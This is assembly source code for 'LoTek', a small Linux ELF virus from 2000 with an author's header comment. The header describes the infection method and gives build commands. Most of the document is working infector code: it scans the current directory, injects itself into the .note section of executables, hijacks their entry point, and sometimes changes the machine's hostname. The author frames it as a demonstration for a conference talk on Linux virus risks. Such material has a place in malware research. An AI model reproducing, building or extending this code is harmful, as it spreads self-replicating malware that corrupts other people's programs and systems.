   ;
   ;   Replicant name................LoTek
   ;   Author........................Wintermute
   ;   Email.........................winter@outlimit.org
   ;   Inception date................Octubre 2000
   ;   Target OS.....................Linux OS
   ;   Size..........................338 bytes
   ;
   ;
   ;   Characteristics
   ;   ---------------
   ;   LoTek is an ELF cavity infector which hides itself in the ".note"
   ;   section in order to replicate without changing file size.
   ;
   ;   It's a runtime virus that replicates by using memory file mapping
   ;   syscalls (mmap), copying itself to this .note section just after
   ;   the .bss one (which is in the same offset as another hole, .comment,
   ;   less easy to infect cuz of that), changing data segment permissions
   ;   in order to make it execute. This ".note" section is used by software
   ;   developers in order to indicate compatibility/etc of the file, and
   ;   is almost always never used.
   ;
   ;   Payload is chaging machine hostname one of each thirty-two executions
   ;   (reading the processor tsc).
   ;
   ;   I just wanna remark this is a "test" virus, just trying an infection
   ;   on Linux; it was writed in order to show an easy example on Linux
   ;   infection in HackMeeting Barcelona'00 to complete a speak I made about
   ;   Linux viruses and their risks (to silence those "Linux-never-can-get
   ;   infected" people).
   ;
   ;   PD: So, you can imagine where the name "LoTek" came from :)
   ;
   ;
   ;   Disclaimer
   ;   ----------
   ;
   ;   As you compile/execute this virus or part of it, you're responsible
   ;   on what happens next; because of beeing limited on searching
   ;   executables (just in the current directory), it's an easy virus
   ;   to control. Anyway, if you don't know exactly what it does, do *not*
   ;   execute it. I also can't assure every file will work 100% after
   ;   infection, so it all up to you, make backups on your files before
   ;   trying LoTek on them.
   ;
   ;   By compiling/executing this virus you accept I'm not responsible
   ;   on what you do with this virus. My intentions are obviously far from
   ;   infecting Linux users, and this is no more than a "laboratory" virus;
   ;   it's very limited, but it would be easy to make it recursively infect
   ;   directories, etc. My intentions with this little replicant are just
   ;   on reminding that linux viruses can be (easily) written, and that
   ;   even though it's a very secure OS, there's a lot of open doors
   ;   expecting for infections.
   ;
   ;   Of course, this virus won't make a big infection, as it's limited to
   ;   executing user's privilege. Linux community doesn't change many
   ;   executables but source codes, so it's nearly impossible a "big
   ;   epidemy".
   ;
   ;   So, I don't think I'm doing any bad to Linux community - which I
   ;   admire and respect - writing a virus like this.
   ;
   ;
   ;
   ;   COMPILATION
   ;   -----------
   ;
   ;   nasm lotek.asm -o lotek.vir -f elf
   ;   gcc -Wall -g -s lotek.vir -o lotek.exec
   ;   dwarf lotek.exec
   ;

   BITS 32
   GLOBAL main
   SECTION .text

   vir_start:
   main:
       pushf
       pushad
       mov     eax, vir_ends-vir_start
       call    delta
   delta:
       pop     ebp
       sub     ebp,delta
       db      0x0f,0x31    ; thx to AVP for this, nasm didn't compile rdtsc
   ;   rdstc
       and     al,31
       jnz     no_activarse
       mov     eax,04ah        ; Set Hostname
       lea     ebx,[Wintah+ebp]
       mov     ecx,0Ah
       int     080h

   no_activarse:

       sub     esp,(10Ah+4)    ; Opendir
       mov     eax,05h
       lea     ebx,[diractual+ebp]
       xor     ecx,ecx
       cdq
       int     080h
       xchg    ebx,eax


   Sigue_Leyendo:

       mov     eax, 059h   ; readdir
       mov     ecx,esp
       int     080h
       or      ax,ax
       jz      yanohaymas

       push    ebx
       lea     ebx,[esp+0Ah+4] ; EBX -> file name
       call    Infectar
       pop     ebx

       jmp     Sigue_Leyendo

   yanohaymas:

       add     esp,(10Ah+4)    ; stack adjust
       popad
       popf

   retback:
       db      068h
   back:
       dd      vir_ends
       ret

   ;   Infection

   Infectar:
       cdq
       inc     edx
       inc     edx
       mov     ecx,edx

       mov     eax,5
       int     080h

       xchg    ebx,eax
       push    ebx

       mov     eax,013h
       loop    $
       int     080h

       mov     [esp+0Ch],eax

       push    ecx
       push    ebx
       inc     ecx
       push    ecx
       inc     ecx
       inc     ecx
       push    ecx
       loop    $
       push    eax
       push    ecx
       mov     ebx,esp
       mov     eax,0x5a
       int     080h        ; mmap(file)
       add     esp,4*6

       mov     dh,7
       mov     ebx,eax
       cmp     eax,0xFFFFF000  ; Same check as mmap.c does
       jbe     Continuar

   j_cer:
       jmp     Close           ; Failure? Bye...

   Continuar:

       mov     eax,(0 - 0x464C457F)  ; Check ELF
       add     eax,dword[ebx]
       jnz     j_cer

       cmp     byte [ebx + 0x10],02h   ; Check exec
       jnz     j_cer

       cmp     byte[ebx+5],cl  ; Infection mark: ei_data = 0
       jz      j_cer

       mov     eax,[esp+0Ch]
       sub     eax,04Ch
       add     eax,ebx
       cmp     [eax],dh
       jnz     j_cer

       cmp     word[eax+10h],(vir_ends-vir_start)
       jb      j_cer       ; Big enough?

       mov     byte [ebx+5],cl
       push    dword [back+ebp]
       push    dword [ebx+18h]
       pop     dword [back+ebp]
       mov     edi,[eax+0Ch]
       push    edi
       add     edi,ebx
       lea     esi,[ebp+vir_start]
       mov     ecx,vir_ends-vir_start
       rep     movsb           ; Copy virus

       pop     eax
       sub     eax,[ebx+098h]
       add     eax,dword[ebx+09Ch] ; Make new ep
       mov     byte [ebx+0ACh],dh
       mov     dword [ebx+18h],eax

       mov     eax,1000h           ;Hardcoded (lazy xD)
       add     dword [ebx+0A4h],eax
       add     dword [ebx+0A8h],eax

       pop     dword [back+ebp]    ;Recover...
   Close:
       mov     eax,91              ;Close mapping
       int     080h
   Chaping:
       pop     ebx
       mov     al,dh
       dec     al                  ;Close file
       int     080h

       ret

   Message: db 'LoTek by '
   Wintah: db  'Wintermute'
   diractual: db   '.',0
   vir_ends:

       ; Old host (first generation)

       mov     eax,1
       int     080h
